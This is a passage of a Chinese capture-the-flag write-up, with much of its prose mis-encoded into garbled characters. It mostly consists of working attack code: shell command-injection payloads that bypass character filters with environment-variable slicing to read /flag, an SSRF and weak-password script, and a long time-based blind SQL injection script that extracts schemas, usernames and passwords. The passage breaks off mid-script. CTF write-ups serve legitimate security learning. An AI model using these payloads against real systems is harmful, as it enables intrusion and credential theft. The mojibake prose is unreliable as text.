1</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘ä»¬çš„å°å†™å­—æ¯è¢«è¿‡æ»¤äº†ï¼Œä¸è¿‡å¤§å†™å­—æ¯å’Œæ•°å­—æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•åˆ©ç”¨ç¯å¢ƒå˜é‡æˆªå–å…³é”®å­—ç¬¦æ¥æ‹¼æ¥å‘½ä»¤ï¼šï¼ˆå› ä¸ºè¾“å‡ºå¦‚æœæœ‰ flag æˆ–è€… xpctf å­—ç¬¦ä¸²å°±ä¼šè¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨ base64 è¾“å‡ºï¼Œä¹Ÿå¯ä»¥ç”¨ revï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ç©ºæ ¼: $IFS$9</span><br><span class="line">/: $&#123;PATH:0:1&#125;</span><br><span class="line">/bin/ls: $&#123;PATH:0:1&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;</span><br><span class="line">/usr/bin/base64: $&#123;PATH:0:5&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;$&#123;PATH:12:1&#125;???64</span><br><span class="line">/bin/cat: $&#123;PATH:0:1&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;?$&#123;FLAG:6:1&#125;$&#123;FLAG:2:1&#125;</span><br><span class="line">/flag: $&#123;PATH:0:1&#125;$&#123;FLAG:4:4&#125;</span><br></pre></td></tr></table></figure><p>æ‹¼æ¥å¾—åˆ°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls / | base64</span><br><span class="line">127.0.0.1|$&#123;PATH:0:1&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;$IFS$9$&#123;PATH:0:1&#125;|$&#123;PATH:0:5&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;$&#123;PATH:12:1&#125;???64%26$&#123;PATH:0:1&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;?$&#123;PATH:13:2&#125;$&#123;FLAG:7:1&#125;$IFS$9127.0.0.1</span><br><span class="line">cat /flag  | base64</span><br><span class="line">127.0.0.1|$&#123;PATH:0:1&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;?$&#123;FLAG:6:1&#125;$&#123;FLAG:2:1&#125;$IFS$9$&#123;PATH:0:1&#125;$&#123;FLAG:4:4&#125;|$&#123;PATH:0:5&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;$&#123;PATH:12:1&#125;???64%26$&#123;PATH:0:1&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;?$&#123;PATH:13:2&#125;$&#123;FLAG:7:1&#125;$IFS$9127.0.0.1</span><br></pre></td></tr></table></figure><p>æ‰å‘ç°ä¸è¦æ„é€  ping é—­åˆåé¢çš„ï¼Œæˆ‘æ˜¯å‚»é€¼ã€‚ã€‚</p><p>å¯ä»¥é€‚å½“åšä¸€ä¸‹æ‹“å±•ï¼ŒæŠŠ WAF ç¨å¾®æ¢ä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]| |FLAG|HOME|PWD|PATH|MAIL|LANG|BASH|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|HOSTNAME|EUID|LANG|LESSOPEN|LINES|OLD|MACHTYPE|PPID|SHLVL|FUNCNAME|OPTIND|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|#|%|\&gt;|\&lt;|\&#x27;|\&quot;|\`|_|\,/&#x27;</span>, <span class="variable">$url</span>)</span><br></pre></td></tr></table></figure><p>ä¹Ÿæ²¡å•¥ï¼Œå°±æŠŠæ•°å­—è¿‡æ»¤äº†ï¼Œå†åŠ ä¸Šè¿‡æ»¤äº†ç‚¹å‰é¢ç”¨åˆ°çš„å•¥ PATHã€FLAGã€‚ã€‚ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">OPTERR=1</span><br><span class="line">HOSTTYPE=x86_64</span><br><span class="line">UID=1001</span><br><span class="line">TERM=</span><br><span class="line">EUID=0</span><br><span class="line">ID=0</span><br><span class="line">OSTYPE=linux-gnu</span><br><span class="line">LOGNAME=root</span><br><span class="line">SHELL=/sbin/nologin</span><br><span class="line">SHELLOPTS=braceexpand:hashall:interactive-comments:posix</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">OPTERR = 1</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;UID:<span class="variable">$OPTERR</span>:<span class="variable">$OPTERR</span>&#125; = 0</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;HOSTTYPE:<span class="variable">$OPTERR</span>:OPTERR&#125; = 8</span></span><br><span class="line"></span><br><span class="line">ç©ºæ ¼ -&gt; $&#123;IFS&#125;</span><br><span class="line">/ -&gt; $&#123;SHELL::$OPTERR&#125;</span><br><span class="line">l -&gt; $&#123;OSTYPE::$OPTERR&#125;</span><br><span class="line">i -&gt; $&#123;OSTYPE:$OPTERR:$OPTERR&#125;</span><br><span class="line">d -&gt; $&#123;TERM::$OPTERR&#125;</span><br><span class="line">u -&gt; $&#123;OSTYPE:~A:$OPTERR&#125;</span><br><span class="line">1</span><br><span class="line">0</span><br><span class="line">8</span><br><span class="line">4 -&gt; $&#123;HOSTTYPE:~A:$OPTERR&#125;</span><br><span class="line">x</span><br><span class="line">r -&gt; $&#123;LOGNAME::$OPTERR&#125;</span><br><span class="line">n -&gt; $&#123;SHELL:~A:$OPTERR&#125;</span><br><span class="line">b -&gt; $&#123;SHELLOPTS::$OPTERR&#125;</span><br><span class="line">s -&gt; $&#123;HISTCONTROL:~A:$OPTERR&#125;</span><br><span class="line">t -&gt; $&#123;LOGNAME:~A:$OPTERR&#125;</span><br><span class="line"></span><br><span class="line">1.1 -&gt; $OPTERR.$OPTER</span><br><span class="line">/bin/ -&gt; /?i?/ -&gt; $&#123;SHELL::$OPTERR&#125;?$&#123;OSTYPE:$OPTERR:$OPTERR&#125;?$&#123;SHELL::$OPTERR&#125;</span><br><span class="line">/bin/dir -&gt; /?i?/di? -&gt; $&#123;SHELL::$OPTERR&#125;?$&#123;OSTYPE:$OPTERR:$OPTERR&#125;?$&#123;SHELL::$OPTERR&#125;$&#123;TERM::$OPTERR&#125;$&#123;OSTYPE:$OPTERR:$OPTERR&#125;?</span><br><span class="line">/usr/bin/ -&gt; /u??/?i?/ -&gt; $&#123;SHELL::$OPTERR&#125;$&#123;OSTYPE:~A:$OPTERR&#125;??$&#123;SHELL::$OPTERR&#125;?$&#123;OSTYPE:$OPTERR:$OPTERR&#125;?$&#123;SHELL::$OPTERR&#125;</span><br><span class="line">/usr/bin/base64 -&gt; /usr/bin/b?s??4 -&gt; $&#123;SHELL::$OPTERR&#125;$&#123;OSTYPE:~A:$OPTERR&#125;??$&#123;SHELL::$OPTERR&#125;?$&#123;OSTYPE:$OPTERR:$OPTERR&#125;?$&#123;SHELL::$OPTERR&#125;$&#123;SHELLOPTS::$OPTERR&#125;????$&#123;HOSTTYPE:~A:$OPTERR&#125;</span><br><span class="line">/bin/tac -&gt; /?i?/t?? -&gt; $&#123;SHELL::$OPTERR&#125;?$&#123;OSTYPE:$OPTERR:$OPTERR&#125;?$&#123;SHELL::$OPTERR&#125;$&#123;LOGNAME:~A:$OPTERR&#125;??</span><br><span class="line">/bin/nl -&gt; $&#123;SHELL::$OPTERR&#125;?$&#123;OSTYPE:$OPTERR:$OPTERR&#125;?$&#123;SHELL::$OPTERR&#125;$&#123;SHELL:~A:$OPTERR&#125;$&#123;OSTYPE::$OPTERR&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºæ²¡äº†æ•°å­—ï¼Œæ‰€ä»¥æ²¡åŠæ³•ç”¨ 127.0.0.1 äº†ã€‚ã€‚å¯ä»¥éšä¾¿ç³Šå¼„ä¸ª 1.1ï¼Œç®€å•æ„é€ ä¸€æ³¢ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/bin/dir / | base64</span><br><span class="line"><span class="meta">$</span><span class="bash">OPTERR.<span class="variable">$OPTERR</span>|<span class="variable">$&#123;SHELL::$OPTERR&#125;</span>?<span class="variable">$&#123;OSTYPE:$OPTERR:$OPTERR&#125;</span>?<span class="variable">$&#123;SHELL::$OPTERR&#125;</span><span class="variable">$&#123;TERM::$OPTERR&#125;</span><span class="variable">$&#123;OSTYPE:$OPTERR:$OPTERR&#125;</span>?<span class="variable">$&#123;IFS&#125;</span><span class="variable">$&#123;SHELL::$OPTERR&#125;</span>|<span class="variable">$&#123;SHELL::$OPTERR&#125;</span><span class="variable">$&#123;OSTYPE:~A:$OPTERR&#125;</span>??<span class="variable">$&#123;SHELL::$OPTERR&#125;</span>?<span class="variable">$&#123;OSTYPE:$OPTERR:$OPTERR&#125;</span>?<span class="variable">$&#123;SHELL::$OPTERR&#125;</span><span class="variable">$&#123;SHELLOPTS::$OPTERR&#125;</span>????<span class="variable">$&#123;HOSTTYPE:~A:$OPTERR&#125;</span>%26</span></span><br><span class="line">/bin/nl /flag | base64</span><br><span class="line"><span class="meta">$</span><span class="bash">OPTERR.<span class="variable">$OPTERR</span>|<span class="variable">$&#123;SHELL::$OPTERR&#125;</span>?<span class="variable">$&#123;OSTYPE:$OPTERR:$OPTERR&#125;</span>?<span class="variable">$&#123;SHELL::$OPTERR&#125;</span><span class="variable">$&#123;SHELL:~A:$OPTERR&#125;</span><span class="variable">$&#123;OSTYPE::$OPTERR&#125;</span><span class="variable">$&#123;IFS&#125;</span><span class="variable">$&#123;SHELL::$OPTERR&#125;</span>?<span class="variable">$&#123;OSTYPE::$OPTERR&#125;</span>??|<span class="variable">$&#123;SHELL::$OPTERR&#125;</span><span class="variable">$&#123;OSTYPE:~A:$OPTERR&#125;</span>??<span class="variable">$&#123;SHELL::$OPTERR&#125;</span>?<span class="variable">$&#123;OSTYPE:$OPTERR:$OPTERR&#125;</span>?<span class="variable">$&#123;SHELL::$OPTERR&#125;</span><span class="variable">$&#123;SHELLOPTS::$OPTERR&#125;</span>????<span class="variable">$&#123;HOSTTYPE:~A:$OPTERR&#125;</span>%26</span></span><br></pre></td></tr></table></figure><h2 id="Web-é‡ç”Ÿä¹‹æˆ‘æ˜¯èµŒåœ£"><a href="#Web-é‡ç”Ÿä¹‹æˆ‘æ˜¯èµŒåœ£" class="headerlink" title="Web-é‡ç”Ÿä¹‹æˆ‘æ˜¯èµŒåœ£"></a>Web-é‡ç”Ÿä¹‹æˆ‘æ˜¯èµŒåœ£</h2><p>è€ƒå¯Ÿå†™è„šæœ¬çš„èƒ½åŠ›ï¼Œè€ƒç‚¹ï¼š</p><ul><li>ssrf + å¼±å¯†ç </li><li>åˆ©ç”¨èµŒåœºCookieå­˜å‚¨æ¼æ´</li></ul><p>ç›´æ¥è´´è„šæœ¬å§ï¼Œè¿™é¢˜æ˜¯æœ€ç®€å•çš„äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://b8a1bad7-9300-453d-88e2-ce7a5684cf65.node.oj.huts.ec/&quot;</span></span><br><span class="line">conn = requests.get(url=url + <span class="string">&quot;index.php?url=http://127.0.0.1/login.php?username=admin%26password=admin&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> conn.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;/var/www/html/fuck_chutiren.txt&quot;</span>)</span><br><span class="line">conn = requests.post(url=url + <span class="string">&quot;main.php&quot;</span>)</span><br><span class="line">cook = conn.cookies</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    conn = requests.post(url=url + <span class="string">&quot;main.php&quot;</span>, cookies=cook)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xpctf&#123;&quot;</span> <span class="keyword">in</span> conn.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;é™©èƒœ&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(conn.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;æ­å–œ&quot;</span> <span class="keyword">in</span> conn.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;èŠœæ¹–&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(conn.cookies[<span class="string">&#x27;num&#x27;</span>])</span><br><span class="line">        <span class="comment"># print(conn.text)</span></span><br><span class="line">        cook = conn.cookies</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h2 id="Web-ğŸ‘´å¦‚ä½•èŠ±å¿’å¥¶å¥¶çš„ä¸€å¤©é€ƒç¦»ç›‘ç‹±"><a href="#Web-ğŸ‘´å¦‚ä½•èŠ±å¿’å¥¶å¥¶çš„ä¸€å¤©é€ƒç¦»ç›‘ç‹±" class="headerlink" title="Web-ğŸ‘´å¦‚ä½•èŠ±å¿’å¥¶å¥¶çš„ä¸€å¤©é€ƒç¦»ç›‘ç‹±"></a>Web-ğŸ‘´å¦‚ä½•èŠ±å¿’å¥¶å¥¶çš„ä¸€å¤©é€ƒç¦»ç›‘ç‹±</h2><p>è¿™é¢˜æŒºæœ‰æ„æ€çš„ï¼Œæœ¬æ¥æ˜¯æºè‡ªæˆ‘å’Œå®¤å‹ä¸€èµ·å†™çš„ä¸€ä¸ªå­¦ä¹ é¡¹ç›®â€”â€”â€œç›‘ç‹±ç®¡ç†ç³»ç»Ÿâ€ï¼Œä¸è¿‡ğŸ‘´å·å·åœ¨æ³¨å†Œçš„åç«¯æºœäº†ä¸€ä¸ªæ— ä¼¤å¤§é›…çš„å°æ´ï¼Œä¸€å¼€å§‹è‡ªå·±æµ‹è¯•çš„æ—¶å€™æ˜¯ä¸€ç›´åœ¨å°è¯•æŠ¥é”™æ³¨å…¥ï¼Œç„¶åå†™å…¥æ–‡ä»¶è¯»å–ï¼Œç„¶åä¸€ç›´å¤±è´¥ï¼Œæœ€åå»æ‰¾äº†è°­æ€»èŠäº†ä¸‹ï¼Œå‘ç°è¿˜æ˜¯æ€ç»´å±€é™äº†ï¼Œä¸€ç›´æƒ³ç€è¦æŠ¥é”™å†™æ–‡ä»¶ï¼Œå¿˜äº†å¯ä»¥æ—¶é—´ç›²æ³¨ï¼Œè„‘å­å¡äº†å¡äº†ã€‚åé¢å’ŒğŸ‹èŠå¤©çš„æ—¶å€™ï¼ŒğŸ‹è¯´äº†å¥è´¼æœ‰é“ç†çš„è¯ï¼šâ€œä½ æ€»ä¸èƒ½è®©åˆ«äººä¸€è¾¹å†™å…¥æ•°æ®ä¸€è¾¹å¯¼å‡ºæ•°æ®å§â€ï¼Œæœ€åå°±æ”¾å¼ƒäº†å‚»é€¼æŠ¥é”™æ³¨å…¥ï¼Œé¡ºå¸¦è®¾äº†ä¸ªå°å‘ï¼Œå°†æˆ‘æŠ¥é”™æ³¨å…¥æµ‹è¯•ä¸­ç”¨è¿‡çš„ payload æ”¾åˆ°äº† robots.txt é‡Œé¢ï¼Œä¸è¿‡ä¹Ÿæç¤ºäº†åé¢çš„åŒæ³¨å…¥ã€‚</p><p>ç›´æ¥è´´è„šæœ¬å¥½äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7390941e-b2b7-485b-9c3c-caa29a3f2c6b.node.oj.huts.ec/man/register&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">payload_length = &#123;</span><br><span class="line">    <span class="string">&quot;database&quot;</span>: <span class="string">&quot;0&#x27; or (case when (length((select database()))=%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;user&quot;</span>: <span class="string">&quot;0&#x27; or (case when (length((select user()))=%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;version&quot;</span>: <span class="string">&quot;0&#x27; or (case when (length((select version()))=%d) then sleep(1.8) else 1 end)) #&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">payload_data = &#123;</span><br><span class="line">    <span class="string">&quot;database&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select database()),%d,1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;user&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select user()),%d,1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;version&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select version()),%d,1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;schemata0&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(schema_name) from information_schema.schemata limit 0,&quot;</span></span><br><span class="line">                 <span class="string">&quot;1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;schemata1&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(schema_name) from information_schema.schemata limit 1,&quot;</span></span><br><span class="line">                 <span class="string">&quot;1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;schemata2&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(schema_name) from information_schema.schemata limit 2,&quot;</span></span><br><span class="line">                 <span class="string">&quot;1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;schemata3&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(schema_name) from information_schema.schemata limit 3,&quot;</span></span><br><span class="line">                 <span class="string">&quot;1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;schemata4&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(schema_name) from information_schema.schemata limit 4,&quot;</span></span><br><span class="line">                 <span class="string">&quot;1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;schemata5&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(schema_name) from information_schema.schemata limit 5,&quot;</span></span><br><span class="line">                 <span class="string">&quot;1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;tables0&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(table_name) from information_schema.tables where &quot;</span></span><br><span class="line">               <span class="string">&quot;table_schema=database() limit 0, 1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;tables1&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(table_name) from information_schema.tables where &quot;</span></span><br><span class="line">               <span class="string">&quot;table_schema=database() limit 1, 1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;columns0_users&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(column_name) from information_schema.columns &quot;</span></span><br><span class="line">                      <span class="string">&quot;where table_name=&#x27;users&#x27; limit 0, 1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;columns1_users&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(column_name) from information_schema.columns &quot;</span></span><br><span class="line">                      <span class="string">&quot;where table_name=&#x27;users&#x27; limit 1, 1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;columns0_flags&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(column_name) from information_schema.columns &quot;</span></span><br><span class="line">                      <span class="string">&quot;where table_name=&#x27;usfffffffffffffffffffflllllllllllaaaaaaaaaaaaaaggggggggggggg&#x27; limit 0, 1),&quot;</span></span><br><span class="line">                      <span class="string">&quot;%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;users_username_password_0&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat_ws(&#x27;:&#x27;,username,password) from (&quot;</span></span><br><span class="line">                                 <span class="string">&quot;select * from users)a limit 0, 1), %d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;users_username_password_1&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat_ws(&#x27;:&#x27;,username,password) from (&quot;</span></span><br><span class="line">                                 <span class="string">&quot;select * from users)a limit 1, 1), %d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;users_username_password_2&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat_ws(&#x27;:&#x27;,username,password) from (&quot;</span></span><br><span class="line">                                 <span class="string">&quot;select * from users)a limit 2, 1), %d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;users_username_password_3&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat_ws(&#x27;:&#x27;,username,password) from (&quot;</span></span><br><span class="line">                                 <span class="string">&quot;select * from users)a limit 3, 1), %d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;users_username_password_4&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat_ws(&#x27;:&#x27;,username,password) from (&quot;</span></span><br><span class="line">                                 <span class="string">&quot;select * from users)a limit 4, 1), %d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;users_username_password_5&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat_ws(&#x27;:&#x27;,username,password) from (&quot;</span></span><br><span class="line">                                 <span class="string">&quot;select * from users)a limit 5, 1), %d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;flags_flag&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select flag from &quot;</span></span><br><span class="line">                  <span class="string">&quot;`usfffffffffffffffffffflllllllllllaaaaaaaaaaaaaaggggggggggggg` limit 0, 1), %d, 1))&lt;%d) then &quot;</span></span><br><span class="line">                  <span class="string">&quot;sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random_username</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_length</span>(<span class="params">wh</span>):</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">30</span>):</span><br><span class="line">        time1 = datetime.datetime.now()</span><br><span class="line">        data[<span class="string">&#x27;username&#x27;</span>] = get_random_username()</span><br><span class="line">        data[<span class="string">&#x27;password&#x27;</span>] = payload_length[wh] % i</span><br><span class="line">        conn = requests.post(url, data=data)</span><br><span class="line">        time2 = datetime.datetime.now()</span><br><span class="line">        sec = (time2 - time1).seconds</span><br><span class="line">        <span class="keyword">if</span> sec &gt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;fuck &quot;</span> + wh + <span class="string">&quot; length &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot; failed&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;length for 